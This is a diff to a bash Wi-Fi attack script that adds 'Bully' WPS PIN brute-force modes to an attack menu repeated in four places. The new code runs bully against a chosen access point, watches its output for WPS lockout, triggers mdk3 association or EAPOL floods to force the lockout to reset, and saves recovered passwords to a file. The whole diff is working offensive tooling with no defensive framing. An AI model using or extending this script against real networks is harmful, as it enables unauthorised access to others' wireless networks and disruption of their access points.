@@ -340,8 +340,11 @@ echo "************** - Which Attack Would You Like To Use? - **************
 4)Check if Access Point WPS is UNLOCKED
 5)Reaver with AutoFlood(ASOC)
 6)Reaver with AutoFlood(EAPOL)
+7)Bully
+8)Bully with AutoFlood(ASOC)
+9)Bully with AutoFlood(EAPOL)
 
-*AutoFlood Attacks will store the Password in Root/ReaverOutput.txt Once found*"
+*AutoFlood Attacks will store the Password in Root/(Reaver or Bully)Output.txt Once found*"
 
 read g
 case $g in
@@ -387,6 +390,39 @@ reaver_pid=$!
 while kill -0 $reaver_pid ; do
     DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' ReaverOutput.txt`
     if [[ $DETECT_RATE_LIMITING = *"limiting"* ]]; then
+	run_mdk3_EAPOL2
+    fi
+    sleep 1
+done
+menu
+;;
+	7)
+clear
+bully -b $BSSID -c $CHANNEL $ADAPTER1
+menu
+;;
+	8)
+clear
+bully -b $BSSID -c $CHANNEL $ADAPTER1 | tee BullyOutput.txt &
+bully_pid=$! 
+
+while kill -0 $bully_pid ; do
+    DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' BullyOutput.txt`
+    if [[ $DETECT_RATE_LIMITING = *"lockout"* ]]; then
+	run_mdk3_ASOC2
+    fi
+    sleep 1
+done
+menu
+;;
+	9)
+clear
+bully -b $BSSID -c $CHANNEL $ADAPTER1 | tee BullyOutput.txt &
+bully_pid=$! 
+
+while kill -0 $bully_pid ; do
+    DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' BullyOutput.txt`
+    if [[ $DETECT_RATE_LIMITING = *"lockout"* ]]; then
 	run_mdk3_EAPOL2
     fi
     sleep 1
@@ -491,8 +527,11 @@ echo "************** - Which Attack Would You Like To Use? - **************
 4)Check if Access Point WPS is UNLOCKED
 5)Reaver with AutoFlood(ASOC)
 6)Reaver with AutoFlood(EAPOL)
+7)Bully
+8)Bully with AutoFlood(ASOC)
+9)Bully with AutoFlood(EAPOL)
 
-*AutoFlood Attacks will store the Password in Root/ReaverOutput.txt Once found*"
+*AutoFlood Attacks will store the Password in Root/(Reaver or Bully)Output.txt Once found*"
 
 read j
 case $j in
@@ -538,6 +577,39 @@ reaver_pid=$!
 while kill -0 $reaver_pid ; do
     DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' ReaverOutput.txt`
     if [[ $DETECT_RATE_LIMITING = *"limiting"* ]]; then
+	run_mdk3_EAPOL3
+    fi
+    sleep 1
+done
+menu
+;;
+	7)
+clear
+bully -b $BSSID -c $CHANNEL $ADAPTER1
+menu
+;;
+	8)
+clear
+bully -b $BSSID -c $CHANNEL $ADAPTER1 | tee BullyOutput.txt &
+bully_pid=$! 
+
+while kill -0 $bully_pid ; do
+    DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' BullyOutput.txt`
+    if [[ $DETECT_RATE_LIMITING = *"lockout"* ]]; then
+	run_mdk3_ASOC3
+    fi
+    sleep 1
+done
+menu
+;;
+	9)
+clear
+bully -b $BSSID -c $CHANNEL $ADAPTER1 | tee BullyOutput.txt &
+bully_pid=$! 
+
+while kill -0 $bully_pid ; do
+    DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' BullyOutput.txt`
+    if [[ $DETECT_RATE_LIMITING = *"lockout"* ]]; then
 	run_mdk3_EAPOL3
     fi
     sleep 1
@@ -654,8 +726,11 @@ echo "************** - Which Attack Would You Like To Use? - **************
 4)Check if Access Point WPS is UNLOCKED
 5)Reaver with AutoFlood(ASOC)
 6)Reaver with AutoFlood(EAPOL)
+7)Bully
+8)Bully with AutoFlood(ASOC)
+9)Bully with AutoFlood(EAPOL)
 
-*AutoFlood Attacks will store the Password in Root/ReaverOutput.txt Once found*"
+*AutoFlood Attacks will store the Password in Root/(Reaver or Bully)Output.txt Once found*"
 
 read m
 case $m in
@@ -701,6 +776,39 @@ reaver_pid=$!
 while kill -0 $reaver_pid ; do
     DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' ReaverOutput.txt`
     if [[ $DETECT_RATE_LIMITING = *"limiting"* ]]; then
+	run_mdk3_EAPOL4
+    fi
+    sleep 1
+done
+menu
+;;
+	7)
+clear
+bully -b $BSSID -c $CHANNEL $ADAPTER1
+menu
+;;
+	8)
+clear
+bully -b $BSSID -c $CHANNEL $ADAPTER1 | tee BullyOutput.txt &
+bully_pid=$! 
+
+while kill -0 $bully_pid ; do
+    DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' BullyOutput.txt`
+    if [[ $DETECT_RATE_LIMITING = *"lockout"* ]]; then
+	run_mdk3_ASOC4
+    fi
+    sleep 1
+done
+menu
+;;
+	9)
+clear
+bully -b $BSSID -c $CHANNEL $ADAPTER1 | tee BullyOutput.txt &
+bully_pid=$! 
+
+while kill -0 $bully_pid ; do
+    DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' BullyOutput.txt`
+    if [[ $DETECT_RATE_LIMITING = *"lockout"* ]]; then
 	run_mdk3_EAPOL4
     fi
     sleep 1
@@ -830,8 +938,11 @@ echo "************** - Which Attack Would You Like To Use? - **************
 4)Check if Access Point WPS is UNLOCKED
 5)Reaver with AutoFlood(ASOC)
 6)Reaver with AutoFlood(EAPOL)
+7)Bully
+8)Bully with AutoFlood(ASOC)
+9)Bully with AutoFlood(EAPOL)
 
-*AutoFlood Attacks will store the Password in Root/ReaverOutput.txt Once found*"
+*AutoFlood Attacks will store the Password in Root/(Reaver or Bully)Output.txt Once found*"
 
 read p
 case $p in
@@ -877,6 +988,39 @@ reaver_pid=$!
 while kill -0 $reaver_pid ; do
     DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' ReaverOutput.txt`
     if [[ $DETECT_RATE_LIMITING = *"limiting"* ]]; then
+	run_mdk3_EAPOL5
+    fi
+    sleep 1
+done
+menu
+;;
+	7)
+clear
+bully -b $BSSID -c $CHANNEL $ADAPTER1
+menu
+;;
+	8)
+clear
+bully -b $BSSID -c $CHANNEL $ADAPTER1 | tee BullyOutput.txt &
+bully_pid=$! 
+
+while kill -0 $bully_pid ; do
+    DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' BullyOutput.txt`
+    if [[ $DETECT_RATE_LIMITING = *"lockout"* ]]; then
+	run_mdk3_ASOC5
+    fi
+    sleep 1
+done
+menu
+;;
+	9)
+clear
+bully -b $BSSID -c $CHANNEL $ADAPTER1 | tee BullyOutput.txt &
+bully_pid=$! 
+
+while kill -0 $bully_pid ; do
+    DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' BullyOutput.txt`
+    if [[ $DETECT_RATE_LIMITING = *"lockout"* ]]; then
 	run_mdk3_EAPOL5
     fi
     sleep 1
